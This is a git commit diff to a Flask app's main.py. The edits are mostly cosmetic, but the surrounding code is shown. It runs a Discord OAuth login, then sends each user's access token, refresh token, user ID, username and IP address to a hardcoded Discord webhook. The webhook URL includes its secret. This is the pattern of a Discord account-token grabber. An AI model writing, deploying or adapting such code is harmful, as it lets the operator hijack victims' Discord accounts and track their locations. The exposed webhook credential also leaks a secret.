7ebaa119ca064f1a62ff344f8c34e1512fe989f9
Kaliaad <99507224+Kaliaad@users.noreply.github.com>
2023-12-09 14:55:33 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,5 +1,5 @@
 from requests_oauthlib import OAuth2Session
-from flask import Flask, request, redirect, session, render_template  # render_template eklenmiştir
+from flask import Flask, request, redirect, session, render_template
 import os
 import requests
 
@@ -19,7 +19,7 @@ app.secret_key = os.urandom(24)
 def create_embed(user_id, user_ip, profile_data, access_token, refresh_token, color="#00FF00"):
     embed = {
         'title': 'Discord OAuth Data',
-        'color': int(color.lstrip("#"), 16), 
+        'color': int(color.lstrip("#"), 16),
         'fields': [
             {'name': 'User ID', 'value': str(user_id), 'inline': True},
             {'name': 'Username', 'value': profile_data['username'], 'inline': True},
@@ -31,32 +31,27 @@ def create_embed(user_id, user_ip, profile_data, access_token, refresh_token, co
     }
     return embed
 
-
 @app.route("/")
 def home():
-    # Generate a random state and store it in the session
     state = os.urandom(24)
     session['state'] = state
 
-    oauth = OAuth2Session(client_id, redirect_uri="https://flask-production-6a75.up.railway.app/oauth_callback", scope=scope, state=state)
+    oauth = OAuth2Session(client_id, redirect_uri=redirect_uri, scope=scope, state=state)
     login_url, _ = oauth.authorization_url(authorize_url)
 
-    print("Generated state:", state)  # Eklenen satır
     print("Login url:", login_url)
-
     return render_template('index.html')
-
-
 
 @app.route("/oauth_callback")
 def oauth_callback():
     try:
-        # Check if 'state' is present in the query parameters
         if 'state' not in request.args:
+            print("Callback state:", "Not present")
             return 'Invalid callback. Missing state parameter.'
 
-        # Verify that the state in the query parameters matches the one stored in the session
         if request.args['state'] != session.get('state'):
+            print("Received state:", request.args['state'])
+            print("Stored state:", session.get('state'))
             return 'Invalid callback. State mismatch.'
 
         discord = OAuth2Session(client_id, redirect_uri=redirect_uri, state=session['state'], scope=scope)
@@ -66,12 +61,9 @@ def oauth_callback():
             authorization_response=request.url,
         )
 
-        # Store the token in the session
         session['discord_token'] = token
-
         response = discord.get(base_discord_api_url + '/users/@me')
         user_id = response.json()['id']
-
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
         webhook_url = 'https://discord.com/api/webhooks/1182750185584066711/dn1wISc0tPKn4SIgiwvbZQVnKlOxsLGrIaKpy8QAOaYO5qNmIFu54IpVopxlm8-P7yzJ'
@@ -91,10 +83,9 @@ def oauth_callback():
         return 'Authentication successful. Your data has been sent to the webhook.'
 
     except Exception as e:
-        # Print the detailed error message
         print(f"An error occurred: {e}")
         return f'An error occurred during authentication. Details: {e}'
-    
+
 @app.route("/profile")
 def profile():
     if 'discord_token' not in session:
@@ -106,4 +97,3 @@ def profile():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=7766)
-
